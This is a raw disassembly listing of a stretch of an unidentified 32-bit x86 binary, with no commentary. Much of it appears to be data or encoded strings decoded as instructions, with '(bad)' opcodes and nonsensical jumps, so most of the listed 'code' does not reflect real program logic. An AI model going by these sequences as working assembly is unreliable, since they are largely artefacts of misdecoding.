  42177b:	mov    al,ds:0xa0140042
  421780:	inc    edx
  421781:	add    BYTE PTR [eax],bl
  421783:	mov    al,ds:0xa01c0042
  421788:	inc    edx
  421789:	add    BYTE PTR [eax],al
  42178b:	mov    al,0x42
  42178d:	add    BYTE PTR [eax+esi*4],al
  421790:	inc    edx
  421791:	add    BYTE PTR [eax],cl
  421793:	mov    al,0x42
  421795:	add    BYTE PTR [eax+esi*4],cl
  421798:	inc    edx
  421799:	add    BYTE PTR [eax],dl
  42179b:	mov    al,0x42
  42179d:	add    BYTE PTR [eax+esi*4],dl
  4217a0:	inc    edx
  4217a1:	add    BYTE PTR [eax],bl
  4217a3:	mov    al,0x42
  4217a5:	add    BYTE PTR [eax+esi*4],bl
  4217a8:	inc    edx
  4217a9:	add    BYTE PTR [eax+0x66],bh
  4217ac:	ins    BYTE PTR es:[edi],dx
  4217ad:	jp     0x421806
  4217af:	jbe    0x4217f8
  4217b1:	ja     0x4217f6
  4217b3:	js     0x4217fd
  4217b5:	jno    0x42181a
  4217b7:	inc    edx
  4217b8:	inc    bx
  4217ba:	push   ebp
  4217bb:	jno    0x421833
  4217bd:	ja     0x421826
  4217bf:	dec    edi
  4217c0:	dec    esp
  4217c1:	dec    ebp
  4217c2:	inc    edx
  4217c3:	jno    0x421836
  4217c5:	jae    0x42181a
  4217c7:	push   eax
  4217c8:	arpl   WORD PTR [ebx+0x72],dx
  4217cb:	sbb    eax,DWORD PTR [edx+0x0]
  4217ce:	jp     0x4217eb
  4217d0:	inc    edx
  4217d1:	add    BYTE PTR [edx],dl
  4217d3:	sbb    al,BYTE PTR [edx+0x0]
  4217d6:	out    dx,eax
  4217d7:	or     esi,DWORD PTR [edx+0x304e790e]
  4217dd:	dec    esi
  4217de:	xchg   DWORD PTR [edi+0x3d],ecx
  4217e1:	dec    esi
  4217e2:	scas   eax,DWORD PTR es:[edi]
  4217e3:	dec    edi
  4217e4:	ds dec esi
  4217e6:	js     0x421836
  4217e8:	cmp    ecx,DWORD PTR [esi-0x64]
  4217eb:	dec    edi
  4217ec:	inc    esp
  4217ed:	dec    esi
  4217ee:	jae    0x42183e
  4217f0:	inc    ecx
  4217f1:	dec    esi
  4217f2:	xor    BYTE PTR [esi+0x40],cl
  4217f5:	dec    esi
  4217f6:	pop    esp
  4217f7:	pop    ebp
  4217f8:	pop    edi
  4217f9:	push   edx
  4217fa:	cmp    DWORD PTR [esi+0x79],ecx
  4217fd:	dec    esi
  4217fe:	xor    BYTE PTR [esi-0x79],cl
  421801:	dec    edi
  421802:	cmp    eax,0x3e4faf4e
  421807:	dec    esi
  421808:	js     0x421858
  42180a:	cmp    ecx,DWORD PTR [esi-0x64]
  42180d:	dec    edi
  42180e:	inc    esp
  42180f:	dec    esi
  421810:	mov    DWORD PTR [edi+0x41],ecx
  421813:	dec    esi
  421814:	xor    BYTE PTR [esi+0x40],cl
  421817:	dec    esi
  421818:	pop    esp
  421819:	ins    DWORD PTR es:[edi],dx
  42181a:	pop    edi
  42181b:	bound  edi,QWORD PTR [ecx]
  42181d:	dec    esi
  42181e:	jns    0x42186e
  421820:	xor    BYTE PTR [esi-0x80],cl
  421823:	dec    edi
  421824:	cmp    eax,0x394e734e
  421829:	dec    esi
  42182a:	mov    ds:0x304e3a4f,al
  42182f:	dec    esi
  421830:	inc    esi
  421831:	dec    esi
  421832:	pop    esp
  421833:	jge    0x421894
  421835:	jb     0x4218a6
  421837:	sub    BYTE PTR [esi-0x7d],0x7e
  42183b:	xchg   ebx,eax
  42183c:	jns    0x4217ce
  42183e:	aas    
  42183f:	dec    esi
  421840:	test   BYTE PTR [edi+0x30],cl
  421843:	dec    esi
  421844:	test   BYTE PTR [edi+0x3c],cl
  421847:	dec    esi
  421848:	mov    ds:0x734e394f,al
  42184d:	dec    esi
  42184e:	inc    ebp
  42184f:	dec    esi
  421850:	xor    BYTE PTR [esi+0x44],cl
  421853:	dec    esi
  421854:	pop    esp
  421855:	lea    ebx,[edi-0x7e]
  421858:	outs   dx,DWORD PTR ds:[esi]
  421859:	xchg   edx,eax
  42185a:	outs   dx,BYTE PTR ds:[esi]
  42185b:	xchg   ebx,eax
  42185c:	jle    0x421801
  42185e:	jns    0x421800
  421860:	aas    
  421861:	dec    esi
  421862:	test   BYTE PTR [edi+0x30],cl
  421865:	dec    esi
  421866:	test   BYTE PTR [edi+0x3c],cl
  421869:	dec    esi
  42186a:	mov    ds:0x894e394f,al
  42186f:	dec    edi
  421870:	inc    ebp
  421871:	dec    esi
  421872:	xor    BYTE PTR [esi+0x44],cl
  421875:	dec    esi
  421876:	pop    esp
  421877:	popf   
  421878:	pop    edi
  421879:	xchg   edx,eax
  42187a:	outs   dx,DWORD PTR ds:[esi]
  42187b:	mov    ds:0xb37ea36e,al
  421880:	jns    0x421832
  421882:	aas    
  421883:	dec    esi
  421884:	mov    cs,WORD PTR [edi+0x30]
  421887:	dec    esi
  421888:	lods   al,BYTE PTR ds:[esi]
  421889:	dec    edi
  42188a:	cmp    eax,0x394e734e
  42188f:	dec    esi
  421890:	mov    eax,ds:0x304e3a4f
  421895:	dec    esi
  421896:	inc    esp
  421897:	dec    esi
  421898:	pop    esp
  421899:	lods   eax,DWORD PTR ds:[esi]
  42189a:	pop    edi
  42189b:	mov    ds:0xb36eb26f,al
  4218a0:	jle    0x421865
  4218a2:	jns    0x421864
  4218a4:	aas    
  4218a5:	dec    esi
  4218a6:	mov    cs,WORD PTR [edi+0x30]
  4218a9:	dec    esi
  4218aa:	lods   al,BYTE PTR ds:[esi]
  4218ab:	dec    edi
  4218ac:	cmp    eax,0x394e7e4e
  4218b1:	dec    esi
  4218b2:	lahf   
  4218b3:	dec    edi
  4218b4:	cmp    ecx,DWORD PTR [esi+0x30]
  4218b7:	dec    esi
  4218b8:	inc    ebp
  4218b9:	dec    esi
  4218ba:	pop    esp
  4218bb:	mov    ebp,0xc26fb25f
  4218c0:	outs   dx,BYTE PTR ds:[esi]
  4218c1:	ret    
  4218c2:	jle    0x421897
  4218c4:	jns    0x421896
  4218c6:	aas    
  4218c7:	dec    esi
  4218c8:	mov    cs,WORD PTR [edi+0x30]
  4218cb:	dec    esi
  4218cc:	lods   al,BYTE PTR ds:[esi]
  4218cd:	dec    edi
  4218ce:	cmp    eax,0x394f804e
  4218d3:	dec    esi
  4218d4:	lods   al,BYTE PTR ds:[esi]
  4218d5:	dec    edi
  4218d6:	cmp    cl,BYTE PTR [esi+0x30]
  4218d9:	dec    esi
  4218da:	inc    esi
  4218db:	dec    esi
  4218dc:	pop    esp
  4218dd:	int    0x5f
  4218df:	ret    0xd26f
  4218e2:	outs   dx,BYTE PTR ds:[esi]
  4218e3:	sar    DWORD PTR [esi-0x1d],cl
  4218e6:	jns    0x4218c8
  4218e8:	aas    
  4218e9:	dec    esi
  4218ea:	mov    cs,WORD PTR [edi+0x30]
  4218ed:	dec    esi
  4218ee:	lods   al,BYTE PTR ds:[esi]
  4218ef:	dec    edi
  4218f0:	cmp    eax,0x394f834e
  4218f5:	dec    esi
  4218f6:	mov    ds:0x304e3a4f,al
  4218fb:	dec    esi
  4218fc:	inc    esp
  4218fd:	dec    esi
  4218fe:	pop    esp
  4218ff:	fstp   QWORD PTR [edi-0x2e]
  421902:	outs   dx,DWORD PTR ds:[esi]
  421903:	loop   0x421973
  421905:	jecxz  0x421985
  421907:	repz jns 0x4218fa
  42190a:	aas    
  42190b:	dec    esi
  42190c:	lea    ecx,[edi+0x30]
  42190f:	dec    esi
  421910:	lahf   
  421911:	dec    edi
  421912:	cmp    eax,0x3c4fa04e
  421917:	dec    esi
  421918:	xor    BYTE PTR [esi+0x3f],cl
  42191b:	dec    esi
  42191c:	pop    esp
  42191d:	in     eax,dx
  42191e:	pop    edi
  42191f:	loop   0x421990
  421921:	repnz outs dx,BYTE PTR ds:[esi]
  421923:	repz jle 0x421929
  421926:	jns    0x421928
  421928:	jle    0x42193d
  42192a:	jns    0x42193c
  42192c:	cmp    al,0x4e
  42192e:	jg     0x42197e
  421930:	xor    BYTE PTR [esi-0x65],cl
  421933:	dec    edi
  421934:	xor    cl,BYTE PTR [esi-0x80]
  421937:	dec    edi
  421938:	cmp    al,0x4e
  42193a:	lods   eax,DWORD PTR ds:[esi]
  42193b:	dec    edi
  42193c:	cmp    ecx,DWORD PTR [esi+0x30]
  42193f:	dec    esi
  421940:	inc    ebp
  421941:	dec    esi
  421942:	pop    esp
  421943:	or     eax,0x126f025f
  421948:	outs   dx,BYTE PTR ds:[esi]
  421949:	adc    edi,DWORD PTR [esi+0x23]
  42194c:	jns    0x42196e
  42194e:	aas    
  42194f:	dec    esi
  421950:	add    BYTE PTR [eax],al
  421952:	ficom  DWORD PTR [edi]
  421954:	inc    edx
  421955:	add    dh,cl
  421957:	sbb    DWORD PTR [edx+0x0],eax
  42195a:	(bad)  
  42195b:	sbb    DWORD PTR [edx+0x0],eax
  42195e:	jle    0x42197b
  421960:	inc    edx
  421961:	add    dl,ch
  421963:	sbb    al,BYTE PTR [edx+0x0]
  421966:	outs   dx,BYTE PTR ds:[esi]
  421967:	sbb    eax,DWORD PTR [edx+0x0]
  42196a:	mov    dh,0x19
  42196c:	inc    edx
  42196d:	add    BYTE PTR [edx+0x6a004219],bh
  421973:	sbb    eax,DWORD PTR [edx+0x0]
  421976:	push   ds
  421977:	sbb    al,BYTE PTR [edx+0x0]
  42197a:	or     eax,0x36f89ca9
  42197f:	mov    edx,0x19d2f89c
  421984:	inc    edx
  421985:	add    BYTE PTR [edx-0x49ffbde6],ah
  42198b:	sbb    al,BYTE PTR [edx+0x0]
  42198e:	ret    0x421a
  421991:	add    dl,dl
  421993:	sbb    al,BYTE PTR [edx+0x0]
  421996:	or     bl,BYTE PTR [edx]
  421998:	inc    edx
  421999:	add    dh,dl
  42199b:	pop    ss
  42199c:	inc    edx
  42199d:	add    BYTE PTR [edx],ch
  42199f:	sbb    al,BYTE PTR [edx+0x0]
  4219a2:	sbb    bl,BYTE PTR [edx]
  4219a4:	inc    edx
  4219a5:	add    BYTE PTR [edx-0x49ffbde5],al
  4219ab:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  4219b2:	ficomp WORD PTR [ecx]
  4219b4:	inc    edx
  4219b5:	add    BYTE PTR [esp+ebx*1],dl
  4219b8:	push   ss
  4219b9:	or     DWORD PTR [eax],0x7050d
  4219bf:	add    BYTE PTR [eax+0x0],al
  4219c2:	cmp    al,BYTE PTR [edx+0x3e]
  4219c5:	ds enter 0x4279,0x0
  4219ca:	ins    DWORD PTR es:[edi],dx
  4219cb:	push   ebp
  4219cc:	inc    esp
  4219cd:	imul   ecx,DWORD PTR [eax],0x86275fa
  4219d3:	in     eax,dx
  4219d4:	inc    BYTE PTR [edi]
  4219d6:	aas    
  4219d7:	cli    
  4219d8:	mov    ds:0x4219c605,eax
  4219dd:	add    BYTE PTR [ebp-0x4a07636b],dh
  4219e3:	xchg   esi,eax
  4219e4:	pushf  
  4219e5:	clc    
  4219e6:	mov    ah,0x95
  4219e8:	pushf  
  4219e9:	clc    
  4219ea:	mov    ebx,0xbaf89c95
  4219ef:	xchg   ebp,eax
  4219f0:	pushf  
  4219f1:	clc    
  4219f2:	mov    ecx,0xb8f89c95
  4219f7:	xchg   ebp,eax
  4219f8:	pushf  
  4219f9:	clc    
  4219fa:	mov    edi,0xbef89c95
  4219ff:	xchg   ebp,eax
  421a00:	pushf  
  421a01:	clc    
  421a02:	mov    ebp,0xa6f89c95
  421a07:	xchg   ebp,eax
  421a08:	pushf  
  421a09:	clc    
  421a0a:	jmp    0x4217:0xce6003f9
  421a11:	add    BYTE PTR [eax+eax*2+0x42],ch
  421a15:	add    BYTE PTR [ebx+0x77],dl
  421a18:	jbe    0x421a6a
  421a1a:	mov    dh,0x85
  421a1c:	pushf  
  421a1d:	clc    
  421a1e:	sbb    ecx,ebp
  421a20:	push   eax
  421a21:	pop    es
  421a22:	dec    eax
  421a23:	or     al,BYTE PTR [eax]
  421a25:	add    dl,cl
  421a27:	pop    ss
  421a28:	inc    edx
  421a29:	add    BYTE PTR [ebx],bl
  421a2b:	or     eax,DWORD PTR [esi+ecx*1]
	...
  421a5e:	ins    BYTE PTR es:[edi],dx
  421a5f:	inc    eax
  421a60:	inc    edx
  421a61:	add    BYTE PTR [esi+0x66f89c85],dh
  421a67:	add    BYTE PTR [edx+0x0],ch
  421a6a:	add    BYTE PTR [si+0x0],ah
  421a6e:	push   0x64006700
  421a73:	add    BYTE PTR [esi+0x0],ah
  421a76:	push   0x0
  421a78:	push   0x66006400
  421a7d:	add    BYTE PTR [edi+0x0],ah
  421a80:	push   0x0
  421a82:	push   0x66006700
  421a87:	add    BYTE PTR [eax+0x0],ch
  421a8a:	add    BYTE PTR [bp+0x0],ah
  421a8e:	push   0x66006700
	...
  421a9b:	add    BYTE PTR [eax],al
  421a9d:	add    BYTE PTR [edi+0x5c],ch
  421aa0:	inc    eax
  421aa1:	add    BYTE PTR [ebp-0x5db060b1],ah
  421aa7:	dec    edi
  421aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421aa9:	dec    edi
  421aaa:	lahf   
  421aab:	dec    edi
  421aac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aad:	dec    edi
  421aae:	ins    DWORD PTR es:[edi],dx
  421aaf:	dec    esi
  421ab0:	bound  ecx,QWORD PTR [esi+0x30]
  421ab3:	dec    esi
  421ab4:	add    BYTE PTR [eax],al
  421ab6:	cdq    
  421ab7:	dec    edi
  421ab8:	pushf  
  421ab9:	dec    edi
  421aba:	fwait
  421abb:	dec    edi
  421abc:	ins    DWORD PTR es:[edi],dx
  421abd:	dec    esi
  421abe:	bound  ecx,QWORD PTR [esi+0x30]
  421ac1:	dec    esi
  421ac2:	scas   eax,DWORD PTR es:[edi]
  421ac3:	dec    edi
  421ac4:	lods   eax,DWORD PTR ds:[esi]
  421ac5:	dec    edi
  421ac6:	lahf   
  421ac7:	dec    edi
  421ac8:	mov    ds:0x624e6d4f,al
  421acd:	dec    esi
  421ace:	xor    BYTE PTR [esi+0x0],cl
  421ad1:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ad7:	dec    edi
  421ad8:	test   eax,0xa04f934f
  421add:	dec    edi
  421ade:	fwait
  421adf:	dec    edi
  421ae0:	xor    BYTE PTR [esi+0x0],cl
  421ae3:	add    BYTE PTR [eax],al
  421ae5:	add    BYTE PTR [eax],al
  421ae7:	add    BYTE PTR [eax],al
  421ae9:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421af0:	mov    WORD PTR [ebp-0x32734274],gs
  421af6:	mov    ebp,ds
  421af8:	mov    ebp,gs
  421afa:	mov    ebp,?
  421afc:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421b02:	mov    WORD PTR ds:0x6d8c5d8c,?
  421b08:	mov    WORD PTR [edx-0x74],?
  421b0b:	jae    0x421a99
  421b0d:	jo     0x421a9b
  421b0f:	jno    0x421a9d
  421b11:	jbe    0x421a9f
  421b13:	ja     0x421aa1
  421b15:	je     0x421aa3
  421b17:	jne    0x421aa5
  421b19:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421b20:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421b26:	lods   al,BYTE PTR ds:[esi]
  421b27:	jge    0x421ae5
  421b29:	jge    0x421ac9
  421b2b:	(bad)  
  421b2c:	jns    0x421ba1
  421b2e:	mov    ecx,0x7d738cb1
  421b33:	ins    DWORD PTR es:[edi],dx
  421b34:	enter  0x9fc6,0x26
  421b38:	jb     0x421b3d
  421b3a:	test   eax,0xb956bb17
  421b3f:	hlt    
  421b40:	test   al,0x37
  421b42:	test   al,0x7e
  421b44:	fnstenv [ecx-0x6a]
  421b47:	mov    cl,0x6a
  421b49:	push   0xffffffce
  421b4b:	or     BYTE PTR [edx],bl
  421b4d:	xlat   BYTE PTR ds:[ebx]
  421b4e:	out    dx,eax
  421b4f:	add    eax,0x9321d7aa
  421b54:	scas   al,BYTE PTR es:[edi]
  421b55:	adc    DWORD PTR [esi],esp
  421b57:	jge    0x421b7c
  421b59:	fidiv  WORD PTR [edi]
  421b5b:	leave  
  421b5c:	hlt    
  421b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b5e:	cmp    ax,0x1fc8
  421b62:	mov    dh,cl
  421b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b65:	(bad)  
  421b66:	and    DWORD PTR [eax],ebx
  421b68:	and    DWORD PTR [ecx-0x18],esi
  421b6b:	(bad)  [ebx+0x7]
  421b6e:	cmc    
  421b6f:	enter  0x301a,0x14
  421b73:	inc    eax
  421b74:	inc    edx
  421b75:	add    BYTE PTR [ecx+0x66],dh
  421b78:	jp     0x421be8
  421b7a:	mov    esi,0x22004219
  421b7f:	sbb    al,BYTE PTR [edx+0x0]
  421b82:	or     ch,ch
  421b84:	adc    al,BYTE PTR [edi]
  421b86:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421b8d:	ins    BYTE PTR es:[edi],dx
  421b8e:	push   0x49657557
  421b93:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421b99:	push   edi
  421b9a:	jp     0x421c16
  421b9c:	dec    ebp
  421b9d:	push   esi
  421b9e:	arpl   WORD PTR gs:[ecx+0x45],si
  421ba2:	dec    edx
  421ba3:	dec    esi
  421ba4:	data16 ja 0x421bf5
  421ba7:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421bc2:	inc    ebp
  421bc3:	push   edx
  421bc4:	jb     0x421c3a
  421bc6:	inc    esi
  421bc7:	je     0x421c0a
  421bc9:	inc    esi
  421bca:	jae    0x421c42
  421bcc:	dec    ebx
  421bcd:	gs dec ecx
  421bcf:	dec    ebp
  421bd0:	dec    ebp
  421bd1:	pop    edx
  421bd2:	jp     0x421c2e
  421bd4:	jbe    0x421c1c
  421bd6:	pop    ecx
  421bd7:	jo     0x421c51
  421bd9:	inc    edi
  421bda:	gs ins BYTE PTR es:[edi],dx
  421bdc:	dec    esp
  421bdd:	js     0x421c47
  421bdf:	inc    edx
  421be0:	js     0x421c28
  421be2:	dec    eax
  421be3:	inc    ebp
  421be4:	inc    esp
  421be5:	inc    esp
  421be6:	push   ecx
  421be7:	dec    edx
  421be8:	ins    BYTE PTR es:[edi],dx
  421be9:	dec    ebx
  421bea:	jbe    0x421c5a
  421bec:	pop    eax
  421bed:	jbe    0x421c3a
  421bef:	inc    ecx
  421bf0:	fs gs jno 0x421c61
  421bf4:	push   ebx
  421bf5:	inc    ecx
  421bf6:	add    BYTE PTR [eax],al
  421bf8:	inc    ebx
  421bf9:	outs   dx,BYTE PTR ds:[esi]
  421bfa:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421bfe:	push   edx
  421bff:	push   ecx
  421c00:	push   0x74000064
  421c05:	jne    0x421c7c
  421c07:	ins    DWORD PTR es:[edi],dx
  421c08:	push   ecx
  421c09:	push   eax
  421c0a:	jo     0x421c86
  421c0c:	addr16 jo 0x421c65
  421c0f:	pop    eax
  421c10:	add    BYTE PTR [eax],al
  421c12:	push   ecx
  421c13:	pop    ecx
  421c14:	inc    ebx
  421c15:	inc    edx
  421c16:	outs   dx,BYTE PTR ds:[esi]
  421c17:	popa   
  421c18:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421c1c:	jne    0x421c8c
  421c1e:	dec    ebx
  421c1f:	je     0x421c84
  421c21:	bound  esp,QWORD PTR [edi+0x0]
  421c24:	jns    0x421c6b
  421c26:	bound  ebp,QWORD PTR [ecx+0x46]
  421c29:	dec    ecx
  421c2a:	ja     0x421c71
  421c2c:	dec    eax
  421c2d:	inc    ebp
  421c2e:	inc    edx
  421c2f:	push   ebx
  421c30:	add    BYTE PTR [eax],al
  421c32:	outs   dx,DWORD PTR ds:[esi]
  421c33:	inc    edi
  421c34:	dec    esi
  421c35:	outs   dx,DWORD PTR ds:[esi]
  421c36:	pop    ecx
  421c37:	inc    edi
  421c38:	jb     0x421c81
  421c3a:	jns    0x421cb2
  421c3c:	inc    ecx
  421c3d:	pop    eax
  421c3e:	dec    esp
  421c3f:	add    BYTE PTR [eax+0x48],bh
  421c42:	bound  edx,QWORD PTR [ebx+0x43]
  421c45:	pop    eax
  421c46:	outs   dx,DWORD PTR ds:[esi]
  421c47:	push   0x4355
  421c4c:	dec    esp
  421c4d:	ins    BYTE PTR es:[edi],dx
  421c4e:	inc    edx
  421c4f:	push   0x76666a73
  421c54:	inc    edx
  421c55:	jo     0x421c57
  421c57:	add    BYTE PTR [eax],al
  421c59:	add    BYTE PTR [edi+0x6d],ah
  421c5c:	je     0x421ca5
  421c5e:	ins    BYTE PTR es:[edi],dx
  421c5f:	jae    0x421ccb
  421c61:	inc    esi
  421c62:	ins    DWORD PTR es:[edi],dx
  421c63:	je     0x421cbb
  421c65:	push   0x56584178
  421c6a:	push   ebx
  421c6b:	addr16 dec edx
  421c6d:	jo     0x421ce1
  421c6f:	js     0x421ce0
  421c71:	pop    eax
  421c72:	dec    ebx
  421c73:	push   esp
  421c74:	dec    esp
  421c75:	jns    0x421cc2
  421c77:	js     0x421cf1
  421c79:	outs   dx,BYTE PTR ds:[esi]
  421c7a:	pop    ecx
  421c7b:	jae    0x421ceb
  421c7d:	push   0x43644448
  421c82:	arpl   WORD PTR [edx+0x55],sp
  421c85:	push   0x42504e67
  421c8a:	push   ebp
  421c8b:	je     0x421d02
  421c8d:	addr16 dec edi
  421c8f:	dec    esp
  421c90:	inc    edx
  421c91:	ins    DWORD PTR es:[edi],dx
  421c92:	inc    esi
  421c93:	inc    esi
  421c94:	inc    esi
  421c95:	arpl   WORD PTR [edx+0x47],bx
  421c98:	push   ebp
  421c99:	inc    ebx
  421c9a:	popa   
  421c9b:	push   edx
  421c9c:	dec    esp
  421c9d:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421ca4:	push   ecx
  421ca5:	push   ebx
  421ca6:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421cad:	dec    edx
  421cae:	jns    0x421d19
  421cb0:	push   edx
  421cb1:	inc    ebx
  421cb2:	jo     0x421d29
  421cb4:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421cb8:	fs push ebx
  421cba:	inc    ebx
  421cbb:	push   ebp
  421cbc:	push   eax
  421cbd:	ja     0x421cfa
  421cbf:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421cc3:	mov    ebp,0xa53ddffb
  421cc8:	js     0x421c83
  421cca:	dec    ebp
  421ccb:	mov    ecx,0xd5b69467
  421cd0:	add    DWORD PTR [eax],eax
  421cd2:	popa   
  421cd3:	add    BYTE PTR [eax],al
  421cd5:	add    BYTE PTR [edi+0x24],ah
  421cd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cd9:	xchg   edx,eax
  421cda:	cwde   
  421cdb:	sbb    al,0xd4
  421cdd:	lahf   
  421cde:	pop    eax
  421cdf:	jbe    0x421d5e
  421ce1:	dec    edx
  421ce2:	(bad)  
  421ce3:	jmp    0x26ad:0xe82a7316
  421cea:	(bad)  
  421ceb:	mov    bh,0x29
  421ced:	ror    BYTE PTR cs:[ebx],cl
  421cf0:	fld    DWORD PTR [ebx+eiz*4+0x1e]
  421cf4:	jl     0x421d4d
  421cf6:	xchg   ecx,eax
  421cf7:	push   esp
  421cf8:	sub    eax,0x6f6d1ccc
  421cfd:	push   0xffffffb6
  421cff:	mov    edi,0x7146c6c4
  421d04:	ret    0xff32
  421d07:	aad    0x62
  421d09:	inc    ecx
  421d0a:	and    al,0xb7
  421d0c:	fadd   QWORD PTR [ebx]
  421d0e:	jb     0x421cbe
  421d10:	cmp    al,0xcc
  421d12:	or     DWORD PTR ds:0x2f83ff66,ecx
  421d18:	into   
  421d19:	cs (bad) 
  421d1b:	jae    0x421d13
  421d1d:	xchg   edx,eax
  421d1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d1f:	pop    ss
  421d20:	(bad)  
  421d21:	mov    edi,0x81382922
  421d26:	test   BYTE PTR [ebx+0x4d],dl
  421d29:	in     eax,dx
  421d2a:	xchg   ecx,eax
  421d2b:	ror    DWORD PTR ds:0x68e7321d,0x0
  421d32:	test   al,bh
  421d34:	les    ecx,FWORD PTR [edx]
  421d36:	add    BYTE PTR cs:[eax],al
  421d39:	add    BYTE PTR [eax],al
  421d3b:	add    BYTE PTR [eax],al
  421d3d:	add    BYTE PTR [eax],ch
  421d3f:	mov    dl,0xa5
  421d41:	push   edx
  421d42:	mov    edi,0x7cfaff57
  421d47:	xlat   BYTE PTR fs:[ebx]
  421d49:	push   esi
  421d4a:	adc    edi,DWORD PTR [edi]
  421d4c:	cmp    ch,bh
  421d4e:	pop    ss
  421d4f:	(bad)  
  421d50:	add    DWORD PTR [eax],eax
  421d52:	popa   
  421d53:	add    BYTE PTR [eax],al
  421d55:	add    ch,bl
  421d57:	cld    
  421d58:	mov    esi,DWORD PTR [ebx-0x3d3d5e3e]
  421d5e:	ss push esp
  421d60:	sbb    dl,cl
  421d62:	out    dx,al
  421d63:	inc    edi
  421d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d65:	cld    
  421d66:	mov    dl,0x34
  421d68:	jno    0x421da6
  421d6a:	imul   eax,DWORD PTR [ebx+0x5f],0xffffff8f
  421d6e:	repz inc esp
  421d70:	mov    ecx,0xddc8ffce
  421d75:	in     eax,0x59
  421d77:	in     eax,dx
  421d78:	aad    0xf3
  421d7a:	sti    
  421d7b:	add    ah,BYTE PTR ds:0x143441a0
  421d81:	xor    BYTE PTR [esi],0x2e
  421d84:	dec    eax
  421d85:	cmc    
  421d86:	or     eax,0xff5a1f9e
  421d8b:	pop    ebx
  421d8c:	dec    ebx
  421d8d:	fstp   TBYTE PTR [eax+0x1a]
  421d90:	shl    BYTE PTR [ebx-0x5f],1
  421d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d94:	sub    eax,esp
  421d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d97:	inc    ebx
  421d98:	mov    ebx,0x5dee3434
  421d9d:	xor    eax,0xfda72c
  421da2:	or     DWORD PTR [esi+eax*2-0x67a5ddcd],edi
  421da9:	mov    eax,ds:0x5872fb25
  421dae:	call   0xcf32:0x533ffada
  421db5:	jb     0x421dfa
  421db7:	add    BYTE PTR [eax],al
  421db9:	add    BYTE PTR [eax],al
  421dbb:	add    BYTE PTR [eax],al
  421dbd:	add    BYTE PTR [ebx-0x7e80ab],dh
  421dc3:	stos   DWORD PTR es:[edi],eax
  421dc4:	push   DWORD PTR [edi-0x42]
  421dc7:	xchg   esi,eax
  421dc8:	push   0xea7bbf57
  421dcd:	(bad)  
  421dce:	js     0x421da6
  421dd0:	add    DWORD PTR [eax],eax
  421dd2:	popa   
  421dd3:	add    BYTE PTR [eax],al
  421dd5:	add    BYTE PTR [eax+0x9d82de0],bl
  421ddb:	or     eax,0x802ca8e0
  421de0:	mov    BYTE PTR [ecx+ecx*1+0x50186920],dl
  421de7:	mov    ch,0xa5
  421de9:	inc    ebx
  421dea:	jp     0x421dbf
  421dec:	xchg   esi,eax
  421ded:	outs   dx,BYTE PTR ds:[esi]
  421dee:	push   esi
  421def:	rol    bl,0xf0
  421df2:	shr    esi,1
  421df4:	push   edx
  421df5:	adc    edi,DWORD PTR [edi-0x5df6c3a5]
  421dfb:	cmp    cl,BYTE PTR [ebp-0x1f]
  421dfe:	add    BYTE PTR [edx],bh
  421e00:	push   ss
  421e01:	mov    dh,0x92
  421e03:	jecxz  0x421dc2
  421e05:	xchg   ebp,eax
  421e06:	iret   
  421e07:	dec    ebp
  421e08:	retf   
  421e09:	mov    BYTE PTR [edx],ah
  421e0b:	repnz ror DWORD PTR [ebp+eax*8+0x24],1
  421e10:	mov    WORD PTR [ebx],?
  421e12:	xchg   edi,eax
  421e13:	fiadd  DWORD PTR [edi+0x3e]
  421e16:	or     dh,bh
  421e18:	jnp    0x421deb
  421e1a:	inc    ecx
  421e1b:	xlat   BYTE PTR ds:[ebx]
  421e1c:	retf   0x41f5
  421e1f:	popf   
  421e20:	xor    eax,esi
  421e22:	sub    ebp,DWORD PTR [edi-0x21]
  421e25:	mov    cl,0x73
  421e27:	test   eax,0x2820a8ae
  421e2c:	outs   dx,DWORD PTR ds:[esi]
  421e2d:	shr    esi,0xb9
  421e30:	jns    0x421e6b
  421e32:	jns    0x421dd2
  421e34:	(bad)  
  421e35:	addr16 pop ecx
  421e37:	add    BYTE PTR [eax],al
  421e39:	add    BYTE PTR [eax],al
  421e3b:	add    BYTE PTR [eax],al
  421e3d:	add    BYTE PTR [eax],bh
  421e3f:	(bad)  
  421e40:	cmp    ah,BYTE PTR [esi+edi*8]
  421e43:	in     al,dx
  421e44:	fimul  WORD PTR ds:[edi+0x6cac6bd5]
  421e4b:	or     eax,edx
  421e4d:	popa   
  421e4e:	(bad)  
  421e50:	add    DWORD PTR [eax],eax
  421e52:	popa   
  421e53:	add    BYTE PTR [eax],al
  421e55:	add    dh,dl
  421e57:	xor    eax,0x6975099
  421e5c:	sbb    edi,DWORD PTR [ecx+0x130f4354]
  421e62:	lahf   
  421e63:	cmp    BYTE PTR [esi+0xa65daae],bl
  421e69:	gs xchg ebp,eax
  421e6b:	push   0x8070b64b
  421e70:	out    0x3e,al
  421e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e73:	(bad)  
  421e74:	lock cld 
  421e76:	int    0xb
  421e78:	mov    cl,0xd0
  421e7a:	jecxz  0x421e33
  421e7c:	pop    edx
  421e7d:	xchg   ebx,eax
  421e7e:	pop    esi
  421e7f:	pop    esp
